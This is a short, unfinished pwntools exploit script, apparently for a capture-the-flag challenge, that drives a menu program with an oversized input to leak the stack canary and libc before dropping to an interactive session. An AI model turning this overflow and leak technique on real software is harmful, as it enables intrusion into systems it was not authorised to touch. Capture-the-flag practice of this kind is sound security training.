#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-linux-x86-64.so.2", checksec=False)

context.binary = exe

if args.LOCAL:
    p = process([exe.path])
else:
    p = remote("addr", 1337)

def addEidi(name, amount):
    p.sendlineafter(b'choice: ', str(1))
    p.sendlineafter(b'name: ', str(1056))
    p.sendlineafter(b'giver: ', name)
    p.sendlineafter(b'received: ', str(amount))

input()

# Leak canary & libc
# size = 0x88
payload = b'a'*0x87
addEidi(payload, 12345)
p.sendline(str(2))

p.interactive()